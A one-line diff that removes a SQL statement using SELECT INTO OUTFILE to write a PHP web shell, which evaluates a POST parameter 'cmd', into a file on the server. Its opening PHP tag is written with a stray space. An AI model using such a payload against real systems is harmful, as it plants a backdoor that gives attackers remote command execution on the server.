@@ -1,1 +1,0 @@
-Select '<? php eval($_POST[cmd]);?>' into outfile 'F:/funsens/eval.php';
